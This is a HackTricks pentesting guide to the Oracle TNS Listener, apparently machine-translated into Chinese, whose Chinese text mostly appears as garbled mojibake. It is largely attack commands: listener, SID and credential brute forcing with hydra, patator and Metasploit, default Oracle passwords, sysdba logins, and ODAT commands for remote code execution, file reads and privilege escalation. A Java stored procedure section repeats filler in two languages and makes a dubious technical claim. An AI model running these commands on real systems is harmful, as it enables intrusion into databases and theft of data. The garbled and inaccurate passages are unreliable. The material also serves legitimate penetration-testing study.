# 1521,1522-1529 - Pentesting Oracle TNS Listener

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

Oracleæ•°æ®åº“ï¼ˆOracle DBï¼‰æ˜¯æ¥è‡ªOracle Corporationçš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://www.techopedia.com/definition/8711/oracle-database)ï¼‰ã€‚

åœ¨æšä¸¾Oracleæ—¶ï¼Œç¬¬ä¸€æ­¥æ˜¯ä¸é€šå¸¸ä½äºé»˜è®¤ç«¯å£ï¼ˆ1521/TCPï¼Œ-ä½ ä¹Ÿå¯èƒ½åœ¨1522-1529ä¸Šè·å¾—è¾…åŠ©ç›‘å¬å™¨ï¼‰çš„TNS Listenerè¿›è¡Œé€šä¿¡ã€‚
```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```
## æ¦‚è¿°

1. **æšä¸¾ç‰ˆæœ¬**ä¿¡æ¯ï¼ˆæœç´¢å·²çŸ¥æ¼æ´ï¼‰
2. **æš´åŠ›ç ´è§£TNSç›‘å¬å™¨**é€šä¿¡ï¼ˆä¸æ€»æ˜¯å¿…éœ€çš„ï¼‰
3. **æšä¸¾**/æš´åŠ›ç ´è§£**SIDåç§°**ï¼ˆå¦‚æ•°æ®åº“åç§°ï¼‰
4. **æš´åŠ›ç ´è§£å‡­æ®**ä»¥å‘ç°æœ‰æ•ˆçš„SIDåç§°
5. å°è¯•**æ‰§è¡Œä»£ç **

ä¸ºäº†ä½¿ç”¨MSF Oracleæ¨¡å—ï¼Œæ‚¨éœ€è¦å®‰è£…ä¸€äº›ä¾èµ–é¡¹ï¼š[**å®‰è£…**](oracle-pentesting-requirements-installation.md)

## æšä¸¾

å¯ä»¥ä½¿ç”¨çš„å·¥å…·æœ‰ï¼šnmapã€MSFå’Œ[tnscmd10g](http://dokfleed.net/files/audit/tnscmd10g.zip)ã€‚

### TNSç›‘å¬å™¨ç‰ˆæœ¬
```bash
nmap --script "oracle-tns-version" -p 1521 -T4 -sV <IP>
msf> use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h <IP>
```
å…¶ä»–æœ‰ç”¨çš„TNSç›‘å¬å™¨å‘½ä»¤ï¼š

| **å‘½ä»¤**       | **ç›®çš„**                                                         |
| ------------ | --------------------------------------------------------------- |
| ping         | å¯¹ç›‘å¬å™¨è¿›è¡Œpingæµ‹è¯•                                               |
| version      | æä¾›ç›‘å¬å™¨ç‰ˆæœ¬å’Œå¹³å°ä¿¡æ¯çš„è¾“å‡º                                       |
| status       | è¿”å›ç›‘å¬å™¨å½“å‰çŠ¶æ€å’Œä½¿ç”¨çš„å˜é‡                                     |
| services     | è½¬å‚¨æœåŠ¡æ•°æ®                                                       |
| debug        | å°†è°ƒè¯•ä¿¡æ¯è½¬å‚¨åˆ°ç›‘å¬å™¨æ—¥å¿—ä¸­                                         |
| reload       | é‡æ–°åŠ è½½ç›‘å¬å™¨é…ç½®æ–‡ä»¶                                             |
| save\_config | å°†ç›‘å¬å™¨é…ç½®æ–‡ä»¶å†™å…¥å¤‡ä»½ä½ç½®                                       |
| stop         | è°ƒç”¨ç›‘å¬å™¨å…³é—­                                                     |

å¦‚æœ**æ”¶åˆ°é”™è¯¯**ï¼Œå¯èƒ½æ˜¯å› ä¸º**TNSç‰ˆæœ¬ä¸å…¼å®¹**ï¼ˆä½¿ç”¨`tnscmd10`çš„`--10G`å‚æ•°ï¼‰ï¼Œå¦‚æœ**é”™è¯¯ä»ç„¶å­˜åœ¨**ï¼Œåˆ™ç›‘å¬å™¨å¯èƒ½å—åˆ°**å¯†ç ä¿æŠ¤**ï¼ˆæ‚¨å¯ä»¥åœ¨[**æ­¤å¤„è¯¦ç»†åˆ—å‡ºçš„é”™è¯¯åˆ—è¡¨ä¸­æŸ¥çœ‹æ‰€æœ‰é”™è¯¯**](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7)ï¼‰- ä¸ç”¨æ‹…å¿ƒ... hydraæ¥æ‹¯æ•‘ï¼š
```
hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```
TNSç›‘å¬å™¨å¯èƒ½å®¹æ˜“å—åˆ°**ä¸­é—´äººæ”»å‡»ï¼ˆMitMï¼‰**ã€‚[åœ¨è¿™é‡Œæ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å®¹æ˜“å—åˆ°æ”»å‡»ä»¥åŠå¦‚ä½•æ‰§è¡Œæ”»å‡»ï¼ˆæ‰€æœ‰ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬12cç‰ˆæœ¬ï¼‰](tns-poison.md)ã€‚

### SIDæšä¸¾

#### **ä»€ä¹ˆæ˜¯SID**

SIDï¼ˆæœåŠ¡æ ‡è¯†ç¬¦ï¼‰å®é™…ä¸Šæ˜¯æ•°æ®åº“åç§°ï¼Œæ ¹æ®å®‰è£…æƒ…å†µï¼Œæ‚¨å¯èƒ½æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªé»˜è®¤çš„SIDï¼Œç”šè‡³å¯ä»¥å®Œå…¨è‡ªå®šä¹‰ç”±dbaå®šä¹‰çš„SIDã€‚

åœ¨ä¸€äº›æ—§ç‰ˆæœ¬ä¸­ï¼ˆåœ¨9ç‰ˆæœ¬ä¸­æœ‰æ•ˆï¼‰ï¼Œæ‚¨å¯ä»¥è¯·æ±‚SIDï¼Œç„¶åæ•°æ®åº“ä¼šå°†å…¶å‘é€ç»™æ‚¨ï¼š
```bash
tnscmd10g status-p 1521 -h <IP> #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)

#msf1
msf> use auxiliary/scanner/oracle/sid_enum
msf> set rhost <IP>
msf> run
#msf2
msf> use auxiliary/admin/oracle/tnscmd
msf> set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf> set rhost <IP>
msf> run #The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)
```
å¦‚æœæ— æ³•é€šè¿‡è¿™ç§æ–¹å¼è®¿é—®åˆ°SIDsï¼Œæ‚¨å°†éœ€è¦å¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£ï¼š

**SIDæš´åŠ›ç ´è§£**

æˆ‘å·²å°†nmapå’ŒMSFçš„SIDåˆ—è¡¨åˆå¹¶ä¸ºä¸€ä¸ªï¼ˆå»é™¤äº†é‡å¤é¡¹ï¼‰ï¼š

{% file src="../../.gitbook/assets/sids-oracle.txt" %}
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid
patator oracle_login host=<IP> sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf> use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
```
ä¸ºäº†ä½¿ç”¨**oracle\_login**å’Œ**patator**ï¼Œæ‚¨éœ€è¦**å®‰è£…**ä»¥ä¸‹å†…å®¹ï¼š
```
pip3 install cx_Oracle --upgrade
```
## **ç›®æ ‡è´¦æˆ·**

**æœ‰SIDå—ï¼Ÿ** å¾ˆå¥½ï¼Œç°åœ¨è®©æˆ‘ä»¬ç»§ç»­ä¸‹ä¸€ä¸ªä»»åŠ¡ï¼Œæå–ç”¨æˆ·è´¦æˆ·ä¿¡æ¯ã€‚ä»è¿™ä¸€ç‚¹å¼€å§‹ï¼Œæ‚¨å¯ä»¥è¿æ¥åˆ°ç›‘å¬å™¨å¹¶æš´åŠ›ç ´è§£å‡­æ®ã€‚

**Metasploit** _\*\*scanner/oracle/oracle\_login_ å®ƒå†…ç½®äº†ä¸€ä¸ªå­—å…¸ï¼Œç”¨äºè¡¨ç¤ºç”¨æˆ·è´¦æˆ·ä¿¡æ¯çš„**æœ€å¸¸è§çš„é»˜è®¤å€¼**ï¼Œä»¥ç™»å½•å:å¯†ç çš„å½¢å¼å‘ˆç°ã€‚é¡ºä¾¿è¯´ä¸€å¥ï¼Œè¿™äº›é»˜è®¤æ¡ç›®ä»£è¡¨äº†Oracleä¸­æœ€å¸¸è§å’Œæœ€ä¸¥é‡çš„å®‰å…¨é—®é¢˜ä¹‹ä¸€ã€‚

**Nmap** ä¹Ÿå¯ä»¥é€šè¿‡è„šæœ¬ _oracle-brute_ æ¥å¸®åŠ©ã€‚è¯·æ³¨æ„ï¼Œæ­¤è„šæœ¬**æ··åˆäº†ç™»å½•åå’Œå¯†ç **ï¼Œå³å®ƒä¼šå°è¯•æ¯ä¸ªç™»å½•åä¸æ¯ä¸ªå¯†ç çš„ç»„åˆï¼Œè¿™éœ€è¦ç›¸å½“é•¿çš„æ—¶é—´ï¼

### **é»˜è®¤å¯†ç **

ä»¥ä¸‹æ˜¯ä¸Oracleå…³è”çš„ä¸€äº›é»˜è®¤å¯†ç ï¼š

* **DBSNMP/DBSNMP**â€Šâ€”â€Šæ™ºèƒ½ä»£ç†ä½¿ç”¨æ­¤å¯†ç ä¸æ•°æ®åº“æœåŠ¡å™¨é€šä¿¡ï¼ˆæ›´æ”¹å®ƒéœ€è¦ä¸€äº›å·¥ä½œï¼‰
* **SYS/CHANGE\_ON\_INSTALL**â€Šâ€”â€ŠOracle v9åŠä¹‹å‰çš„é»˜è®¤sysdbaè´¦æˆ·ï¼Œåœ¨10gç‰ˆæœ¬ä¸­å¿…é¡»æ›´æ”¹ï¼
* **PCMS\_SYS/PCMS\_SYS**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·
* **WMSYS/WMSYS**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·
* **OUTLN/OUTLN**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·
* **SCOTT/TIGER**â€Šâ€”â€Šé»˜è®¤xè´¦æˆ·

å…¶ä»–**é»˜è®¤å¯†ç **å¯ä»¥åœ¨[è¿™é‡Œ](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)å’Œ[è¿™é‡Œ](https://cirt.net/passwords?vendor=Oracle)æ‰¾åˆ°ã€‚

ç‰ˆæœ¬11.1.0.6ã€11.1.0.7ã€11.2.0.1ã€11.2.0.2å’Œ11.2.0.3å®¹æ˜“å—åˆ°**ç¦»çº¿æš´åŠ›ç ´è§£**çš„æ”»å‡»ã€‚[**åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºè¿™ç§æŠ€æœ¯çš„ä¿¡æ¯ã€‚**](remote-stealth-pass-brute-force.md)

### ç”¨æˆ·å/å¯†ç æš´åŠ›ç ´è§£

ä¸åŒçš„å·¥å…·ä¸ºoracleæä¾›äº†**ä¸åŒçš„ç”¨æˆ·å/å¯†ç åˆ—è¡¨**ï¼š

* **oscan:** _/usr/share/oscanner/accounts.default_ (169è¡Œ)
* **MSF-1:** _from_ admin/oracle/oracle\_login \_\_/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598è¡Œ)
* **MSF-2:** _from scanner/oracle/oracle\_login_ _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568è¡Œ)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687è¡Œ)

æˆ‘å·²ç»**æ··åˆ**äº†å®ƒä»¬å¹¶**åˆ é™¤äº†é‡å¤é¡¹**ï¼š

{% file src="../../.gitbook/assets/users-oracle.txt" %}

{% file src="../../.gitbook/assets/pass-oracle.txt" %}

### [æš´åŠ›ç ´è§£](../../generic-methodologies-and-resources/brute-force.md#oraclesql)

ç°åœ¨ï¼Œæ‚¨**çŸ¥é“ä¸€ä¸ªæœ‰æ•ˆçš„SIDå’Œæœ‰æ•ˆçš„å‡­æ®**ã€‚è¦è¿æ¥åˆ°æ•°æ®åº“ï¼Œæ‚¨éœ€è¦ä½¿ç”¨å·¥å…·ï¼š_**sqlplus**_ï¼Œå¹¶ä¸”éœ€è¦æŒ‰ç…§ä¸€äº›æ­¥éª¤è¿›è¡Œå®‰è£…ï¼š

[å®‰è£…](oracle-pentesting-requirements-installation.md)

ä½¿ç”¨å·²çŸ¥å‡­æ®ç™»å½•ï¼š
```
sqlplus <username>/<password>@<ip_address>/<SID>;
```
å¦‚æœTNSç›‘å¬å™¨ä½äºéé»˜è®¤ç«¯å£ï¼ˆä¾‹å¦‚TCP/1522ï¼‰ä¸Šï¼š
```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```
å¦‚æœä¸€ä¸ªè´¦æˆ·æ‹¥æœ‰ç³»ç»Ÿæ•°æ®åº“æƒé™ï¼ˆsysdbaï¼‰æˆ–ç³»ç»Ÿæ“ä½œå‘˜æƒé™ï¼ˆsysopï¼‰ï¼Œä½ å¯èƒ½å¸Œæœ›å°è¯•ä»¥ä¸‹æ“ä½œï¼š
```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
#Example:
sqlplus SYSTEM/MANAGER@192.168.0.2/ORCL 'as sysdba'
```
## **ä¸€ä½“åŒ–å·¥å…·**

**ä¸€ä¸ªæœ‰è¶£çš„å·¥å…·æ˜¯ oscanner**ï¼Œå®ƒå°†å°è¯•è·å–ä¸€äº›æœ‰æ•ˆçš„ SIDï¼Œç„¶åå¯¹æœ‰æ•ˆå‡­æ®è¿›è¡Œæš´åŠ›ç ´è§£ï¼Œå¹¶å°è¯•æå–ä¸€äº›ä¿¡æ¯ï¼š
```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```
å¦ä¸€ä¸ªå¯ä»¥å®Œæˆæ‰€æœ‰è¿™äº›ä»»åŠ¡çš„å·¥å…·æ˜¯ [**odat**](https://github.com/quentinhardy/odat)ï¼š
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn't be problems in Kali
./odat.py all -s <IP> -p <PORT>
./odat.py all -s <IP> -p <PORT> -d <SID> #To bruteforce accounts for that SID
```
ä½¿ç”¨è¿™äº›é€‰é¡¹ï¼ˆ_-s_å’Œ_-p_ï¼‰ï¼ŒODATå°†åœ¨ç¬¬ä¸€æ­¥ä¸­**æœç´¢æœ‰æ•ˆçš„SID**ï¼ˆç³»ç»ŸIDï¼‰ã€‚æ‚¨å¯ä»¥é…ç½®ä¸€äº›é€‰é¡¹æ¥é…ç½®æ–¹æ³•ï¼ˆä¾‹å¦‚å­—å…¸åˆ—è¡¨æˆ–æš´åŠ›æ”»å‡»ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒODATå°†ä½¿ç”¨ä¸€ä¸ªå¤§çš„å­—å…¸åˆ—è¡¨ï¼Œå¹¶è¿›è¡Œä¸€ä¸ªå°çš„æš´åŠ›æ”»å‡»ã€‚

å¦‚æœODAT**æ‰¾åˆ°è‡³å°‘ä¸€ä¸ªSID**ï¼ˆä¾‹å¦‚_ORCL_ï¼‰ï¼Œå®ƒå°†**æœç´¢æœ‰æ•ˆçš„Oracleè´¦æˆ·**ã€‚å®ƒå°†åœ¨**æ‰¾åˆ°çš„æ¯ä¸ªSIDä¸Š**æ‰§è¡Œæ­¤æ“ä½œã€‚æ‚¨å¯ä»¥ä¸ºå‡­æ®æŒ‡å®šä¸€äº›é€‰é¡¹ï¼ˆä¾‹å¦‚_--accounts-file_ï¼Œ_--accounts-files_ï¼Œ_--login-as-pwd_ï¼‰ã€‚

å¯¹äº**æ¯ä¸ªæœ‰æ•ˆçš„è´¦æˆ·**ï¼ˆä¾‹å¦‚_SYS_ï¼‰**åœ¨æ¯ä¸ªæœ‰æ•ˆçš„å®ä¾‹**ï¼ˆSIDï¼‰ä¸Šï¼ŒODATå°†è¿”å›**æ¯ä¸ªOracleç”¨æˆ·å¯ä»¥åšä»€ä¹ˆ**ï¼ˆä¾‹å¦‚åå‘shellï¼Œè¯»å–æ–‡ä»¶ï¼Œæˆä¸ºDBAï¼‰ã€‚

[**ODAT Wiki**](https://github.com/quentinhardy/odat/wiki)

## è¿œç¨‹ä»£ç æ‰§è¡Œ

è‡³å°‘æœ‰ä¸¤ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä¾‹å¦‚ä½¿ç”¨Javaè¿‡ç¨‹å’ŒDBMS\_SCHEDULERåŒ…ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå¦‚æœWebåº”ç”¨ç¨‹åºä¸­å­˜åœ¨SQLæ³¨å…¥ï¼Œå¹¶ä¸”è¿è¡Œè¯¥åº”ç”¨ç¨‹åºçš„ç”¨æˆ·å…·æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œæ‚¨ä¹Ÿå¯ä»¥å®ç°RCEã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘å¼ºçƒˆå»ºè®®å‡†å¤‡Oracleæ•°æ®åº“æ”»å‡»å·¥å…·ï¼š[ODAT](https://github.com/quentinhardy/odat)ã€‚

### å®‰è£…ODAT
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn't be problems in Kali
```
### é€šè¿‡Javaå­˜å‚¨è¿‡ç¨‹æ‰§è¡Œä»£ç 

In some cases, it may be possible to execute arbitrary code on an Oracle database server by exploiting a vulnerability in the Java stored procedure feature. This feature allows developers to write and execute Java code within the database.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨Javaå­˜å‚¨è¿‡ç¨‹åŠŸèƒ½ä¸­çš„æ¼æ´ï¼Œåœ¨Oracleæ•°æ®åº“æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚è¯¥åŠŸèƒ½å…è®¸å¼€å‘äººå‘˜åœ¨æ•°æ®åº“ä¸­ç¼–å†™å’Œæ‰§è¡ŒJavaä»£ç ã€‚

To exploit this vulnerability, you need to have the necessary privileges to create and execute Java stored procedures. Once you have these privileges, you can create a malicious Java stored procedure that executes the code you want.

è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæ‚¨éœ€è¦å…·å¤‡åˆ›å»ºå’Œæ‰§è¡ŒJavaå­˜å‚¨è¿‡ç¨‹çš„å¿…è¦æƒé™ã€‚ä¸€æ—¦è·å¾—è¿™äº›æƒé™ï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„Javaå­˜å‚¨è¿‡ç¨‹æ¥æ‰§è¡Œæ‚¨æƒ³è¦çš„ä»£ç ã€‚

Here are the general steps to execute code via a Java stored procedure:

ä»¥ä¸‹æ˜¯é€šè¿‡Javaå­˜å‚¨è¿‡ç¨‹æ‰§è¡Œä»£ç çš„ä¸€èˆ¬æ­¥éª¤ï¼š

1. Create a Java class that contains the code you want to execute. This class should implement the `oracle.jdbc.OracleCallableStatement` interface.

   åˆ›å»ºä¸€ä¸ªåŒ…å«æ‚¨æƒ³è¦æ‰§è¡Œçš„ä»£ç çš„Javaç±»ã€‚è¯¥ç±»åº”è¯¥å®ç°`oracle.jdbc.OracleCallableStatement`æ¥å£ã€‚

2. Compile the Java class into a bytecode file (`.class`).

   å°†Javaç±»ç¼–è¯‘ä¸ºå­—èŠ‚ç æ–‡ä»¶ï¼ˆ`.class`ï¼‰ã€‚

3. Create a Java stored procedure in the Oracle database using the `CREATE PROCEDURE` statement. This procedure should call the compiled Java class and execute the desired code.

   ä½¿ç”¨`CREATE PROCEDURE`è¯­å¥åœ¨Oracleæ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªJavaå­˜å‚¨è¿‡ç¨‹ã€‚è¯¥å­˜å‚¨è¿‡ç¨‹åº”è¯¥è°ƒç”¨ç¼–è¯‘çš„Javaç±»å¹¶æ‰§è¡Œæ‰€éœ€çš„ä»£ç ã€‚

4. Execute the Java stored procedure using a SQL statement or a database tool.

   ä½¿ç”¨SQLè¯­å¥æˆ–æ•°æ®åº“å·¥å…·æ‰§è¡ŒJavaå­˜å‚¨è¿‡ç¨‹ã€‚

By following these steps, you can execute arbitrary code on the Oracle database server through a Java stored procedure. However, it's important to note that exploiting this vulnerability requires proper permissions and may be considered unauthorized access.

é€šè¿‡æŒ‰ç…§è¿™äº›æ­¥éª¤æ“ä½œï¼Œæ‚¨å¯ä»¥é€šè¿‡Javaå­˜å‚¨è¿‡ç¨‹åœ¨Oracleæ•°æ®åº“æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ç„¶è€Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´éœ€è¦é€‚å½“çš„æƒé™ï¼Œå¹¶ä¸”å¯èƒ½è¢«è§†ä¸ºæœªç»æˆæƒçš„è®¿é—®ã€‚
```bash
./odat.py java -s <IP> -U <username> -P <password> -d <SID> --exec COMMAND
```
### é€šè¿‡è°ƒåº¦ç¨‹åºæ‰§è¡Œä»£ç 

The Oracle Scheduler is a powerful tool that allows you to schedule and automate tasks within the Oracle database. However, it can also be exploited by hackers to execute malicious code.

To execute code via the Scheduler, you can follow these steps:

1. Identify the target database's Oracle version.
2. Use the appropriate payload for the specific version.
3. Create a job using the `DBMS_SCHEDULER.CREATE_JOB` procedure.
4. Set the job type to `PLSQL_BLOCK` and provide the malicious code as the job action.
5. Schedule the job to run at a specific time or interval.
6. Enable the job using the `DBMS_SCHEDULER.ENABLE` procedure.

Once the job is enabled, the malicious code will be executed according to the specified schedule. This can allow an attacker to gain unauthorized access, escalate privileges, or perform other malicious activities within the Oracle database.

It is important to note that exploiting the Oracle Scheduler requires proper authorization and should only be done for legitimate purposes, such as penetration testing or security auditing. Unauthorized access or misuse of this technique is illegal and unethical.
```bash
./odat.py dbmsscheduler -s <IP> -d <SID> -U <username> -P <password> --exec "C:\windows\system32\cmd.exe /c echo 123&gt;&gt;C:\hacK"
```
[æ›´å¤šç»†èŠ‚è¯·ç‚¹å‡»è¿™é‡Œ](oracle-rce-and-more.md#rce-scheduler)

### é€šè¿‡å¤–éƒ¨è¡¨æ‰§è¡Œä»£ç 
```bash
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
```
â€˜ODAT.pyâ€™éœ€è¦ç‰¹æƒâ€˜CREATE ANY DIRECTORYâ€™ï¼Œé»˜è®¤æƒ…å†µä¸‹åªæˆäºˆDBAè§’è‰²ï¼Œå› ä¸ºå®ƒå°è¯•ä»ä»»ä½•ç›®å½•è€Œä¸ä»…ä»…æ˜¯â€œä½ çš„â€ç›®å½•æ‰§è¡Œæ–‡ä»¶ï¼ˆæ­¤æ”»å‡»çš„æ‰‹åŠ¨ç‰ˆæœ¬éœ€è¦æ›´å°‘çš„ç‰¹æƒï¼‰ã€‚

[æ›´å¤šç»†èŠ‚è¯·å‚è§æ­¤å¤„](oracle-rce-and-more.md#rce-external-tables)

## è¯»/å†™æ–‡ä»¶
```bash
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
[æ›´å¤šç»†èŠ‚è¯·ç‚¹å‡»è¿™é‡Œ](oracle-rce-and-more.md#read-write-files)

## æå‡æƒé™

[æ›´å¤šç»†èŠ‚è¯·ç‚¹å‡»è¿™é‡Œ](oracle-rce-and-more.md#elevating-privileges)

æ‚¨å¯ä»¥ä½¿ç”¨odatä¸­çš„[privescæ¨¡å—](https://github.com/quentinhardy/odat/wiki/privesc)æ¥æå‡æƒé™ã€‚åœ¨è¯¥é“¾æ¥ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä½¿ç”¨odatæå‡æƒé™çš„**å¤šç§æ–¹æ³•**ã€‚
```bash
./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
```
åœ¨Oracle 10.1.0.3.0ä¸Šæµ‹è¯•çš„æ¼æ´ - åº”è¯¥é€‚ç”¨äº10.1.0.5.0åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œæ®è¯´ä¹Ÿé€‚ç”¨äº11gã€‚åœ¨Oracleå…³é”®è¡¥ä¸æ›´æ–°2007å¹´10æœˆä¿®å¤ã€‚
```bash
msf> use auxiliary/sqli/oracle/lt_findricset_cursor
```
## å…è´¹çš„è™šæ‹Ÿç¯å¢ƒç”¨äºæµ‹è¯•

å¦‚æœä½ æƒ³ç»ƒä¹ æ”»å‡»Oracleæ•°æ®åº“ï¼Œæœ€å®‰å…¨çš„æ–¹æ³•æ˜¯æ³¨å†ŒOracle Developer Days Virtualbox VMï¼š

{% embed url="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" %}

æœ¬æ–‡ä¸­çš„å¤§éƒ¨åˆ†ä¿¡æ¯æ¥è‡ªä»¥ä¸‹æ¥æºï¼š[https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573) å’Œ [https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/](https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/)

å…¶ä»–æœ‰è¶£çš„**å‚è€ƒèµ„æ–™**ï¼š

[http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html](http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html)

## HackTricks è‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: Oracle    #Protocol Abbreviation if there is one.
Port_Number:  1521     #Comma separated if there is more than one.
Protocol_Description: Oracle TNS Listener         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for Oracle
Note: |
Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation

#great oracle enumeration tool
navigate to https://github.com/quentinhardy/odat/releases/
download the latest
tar -xvf odat-linux-libc2.12-x86_64.tar.gz
cd odat-libc2.12-x86_64/
./odat-libc2.12-x86_64 all -s 10.10.10.82

for more details check https://github.com/quentinhardy/odat/wiki

https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

Entry_2:
Name: Nmap
Description: Nmap with Oracle Scripts
Command: nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

